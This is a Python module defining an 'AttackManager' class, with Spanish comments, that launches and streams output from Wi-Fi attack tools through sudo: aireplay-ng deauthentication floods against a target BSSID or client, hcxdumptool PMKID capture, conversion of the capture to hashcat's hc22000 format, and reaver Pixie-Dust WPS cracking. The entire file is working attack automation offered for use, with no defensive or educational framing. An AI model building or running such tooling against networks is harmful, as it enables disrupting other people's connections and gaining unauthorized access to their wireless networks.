import subprocess
import asyncio
import os
import time
from config import CAPTURES_DIR, TMP_DIR

class AttackManager:
    def __init__(self):
        self.active_processes = {}

    async def _stream_output(self, attack_id: str, proc: subprocess.Popen, callback):
        loop = asyncio.get_event_loop()
        while True:
            line = await loop.run_in_executor(None, proc.stdout.readline)
            if not line:
                break
            # Llamamos al callback que enviará el mensaje por websocket
            if callback:
                await callback(attack_id, line.strip())
        
        proc.wait()
        if callback:
            await callback(attack_id, "[*] Proceso finalizado.", finished=True)
        
        if attack_id in self.active_processes:
            del self.active_processes[attack_id]

    async def launch_deauth(self, interface: str, bssid: str, client_mac: str = None, count: int = 10, callback=None):
        attack_id = f"deauth_{bssid.replace(':','')}_{int(time.time())}"
        
        cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid]
        if client_mac:
            cmd.extend(["-c", client_mac])
        cmd.append(interface)

        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        self.active_processes[attack_id] = proc
        asyncio.create_task(self._stream_output(attack_id, proc, callback))
        return attack_id

    async def launch_pmkid_attack(self, interface: str, channel: int, callback=None):
        """Lanza hcxdumptool para ataque PMKID rápido (client-less)"""
        attack_id = f"pmkid_{int(time.time())}"
        pcapng_path = os.path.join(CAPTURES_DIR, f"pmkid_{attack_id}.pcapng")
        
        # Primero configuramos el canal con iw
        subprocess.run(["sudo", "iw", "dev", interface, "set", "channel", str(channel)])
        
        cmd = ["sudo", "hcxdumptool", "-i", interface, "-w", pcapng_path, "--do_rcascan"]
        
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        self.active_processes[attack_id] = proc
        asyncio.create_task(self._stream_output(attack_id, proc, callback))
        return attack_id, pcapng_path

    async def prep_hashcat(self, pcapng_path: str, callback=None) -> str:
        """Convierte pcapng a hc22000 usando hcxpcapngtool"""
        attack_id = f"hashcat_prep_{int(time.time())}"
        hash_file = pcapng_path.replace(".pcapng", ".hc22000")
        
        cmd = ["hcxpcapngtool", "-o", hash_file, pcapng_path]
        
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        self.active_processes[attack_id] = proc
        asyncio.create_task(self._stream_output(attack_id, proc, callback))
        return attack_id

    async def launch_reaver_pixie(self, interface: str, bssid: str, channel: int, callback=None):
        attack_id = f"pixie_{bssid.replace(':','')}_{int(time.time())}"
        
        cmd = ["sudo", "reaver", "-i", interface, "-b", bssid, "-c", str(channel), "-K", "1", "-vv"]
        
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        self.active_processes[attack_id] = proc
        asyncio.create_task(self._stream_output(attack_id, proc, callback))
        return attack_id

    def stop_attack(self, attack_id: str):
        if attack_id in self.active_processes:
            proc = self.active_processes[attack_id]
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except:
                proc.kill()
            del self.active_processes[attack_id]
            return True
        return False

attack_manager = AttackManager()
